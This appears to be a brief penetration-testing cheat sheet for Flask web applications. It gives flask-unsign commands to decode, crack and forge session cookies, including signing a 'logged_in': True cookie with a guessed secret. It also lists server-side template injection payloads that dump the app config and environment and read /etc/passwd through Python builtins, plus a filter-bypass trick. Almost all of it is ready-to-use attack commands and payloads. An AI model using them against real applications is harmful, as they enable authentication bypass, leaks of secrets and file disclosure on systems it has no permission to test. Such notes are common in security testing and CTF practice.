# Flask

```text
# https://github.com/Paradoxis/Flask-Unsign

pip3 install flask-unsign
flask-unsign
flask-unsign --decode --cookie 'eyJsb2dnZWRfaW4iOmZhbHNlfQ.XDuWxQ.E2Pyb6x3w-NODuflHoGnZOEpbH8'
flask-unsign --decode --server 'https://www.example.com/login'
flask-unsign --unsign --cookie < cookie.txt
flask-unsign --sign --cookie "{'logged_in': True}" --secret 'CHANGEME'

# Python Flask SSTI Payloads and tricks

* {{url_for.globals}}
* {{request.environ}}
* {{config}}
* {{url_for.__globals__.__builtins__.open('/etc/passwd').read()}}
* {{self}}
* request|attr('class') == request.class == request[\x5f\x5fclass\x5f\x5f]       
```

